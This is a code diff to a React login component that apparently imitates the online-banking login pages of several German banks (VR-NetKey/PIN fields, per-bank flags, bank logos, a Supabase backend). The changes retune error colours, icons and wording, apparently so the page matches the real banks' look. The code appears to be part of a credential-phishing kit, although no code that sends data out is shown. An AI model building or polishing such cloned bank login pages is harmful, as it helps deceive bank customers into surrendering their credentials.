@@ -1,7 +1,7 @@
 // @ts-nocheck
 import { useEffect, useMemo, useRef, useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
-import { Eye, EyeOff, AlertCircle } from "lucide-react";
+import { Eye, EyeOff, AlertCircle, AlertTriangle } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 import { resolveAsset } from "@/lib/bankAssetUrl";
@@ -663,7 +663,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
               )}
 
 
-              {errorMsg && (
+              {errorMsg && !credentialsInvalid && (
                 <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: buttonBorderRadius }}>
                   <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                   <p className="text-sm text-red-600 font-medium">{errorMsg}</p>
@@ -673,10 +673,10 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
                   <div
-                    className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`}
+                    className={`relative ${vrNetKeyError ? "bg-[#fef2f2]" : ""}`}
                     style={{
                       borderRadius: "4px",
-                      backgroundColor: !vrNetKeyError && focusedField === "vr" ? focusTint : undefined,
+                      backgroundColor: !vrNetKeyError && focusedField === "vr" ? focusTint : (vrNetKeyError ? "#fef2f2" : undefined),
                       transition: "background-color 150ms",
                     }}
                   >
@@ -688,7 +688,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onFocus={() => setFocusedField("vr")}
                       onBlur={() => setFocusedField((f) => (f === "vr" ? null : f))}
                       placeholder=" "
-                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
+                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-[#b91c1c]" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
                       style={{
                         ...(!vrNetKeyError && (focusedField === "vr" || vrNetKey) ? { borderColor: focusAccent } : {}),
                         borderRadius: "4px",
@@ -704,9 +704,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                   </div>
 
                   {vrNetKeyError && (
-                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
-                      <AlertCircle className="w-4 h-4" />
-                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
+                    <p className="mt-1 text-sm text-[#b91c1c] font-medium flex items-center gap-1.5">
+                      <AlertTriangle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NETKEY / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
                     </p>
 
                   )}
@@ -714,10 +714,10 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
                 <div>
                   <div
-                    className={`relative ${pinError ? "bg-red-50" : ""}`}
+                    className={`relative ${pinError ? "bg-[#fef2f2]" : ""}`}
                     style={{
                       borderRadius: "4px",
-                      backgroundColor: !pinError && focusedField === "pin" ? focusTint : undefined,
+                      backgroundColor: !pinError && focusedField === "pin" ? focusTint : (pinError ? "#fef2f2" : undefined),
                       transition: "background-color 150ms",
                     }}
                   >
@@ -729,7 +729,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onFocus={() => setFocusedField("pin")}
                       onBlur={() => setFocusedField((f) => (f === "pin" ? null : f))}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-[#b91c1c]" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
                       style={{
                         ...(!pinError && (focusedField === "pin" || pin) ? { borderColor: focusAccent } : {}),
                         borderRadius: "4px",
@@ -755,9 +755,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     </button>
                   </div>
                   {pinError && (
-                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
-                      <AlertCircle className="w-4 h-4" />
-                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : "PIN erforderlich"}
+                    <p className="mt-1 text-sm text-[#b91c1c] font-medium flex items-center gap-1.5">
+                      <AlertTriangle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NETKEY / Alias oder PIN falsch" : "PIN erforderlich"}
                     </p>
                   )}
 
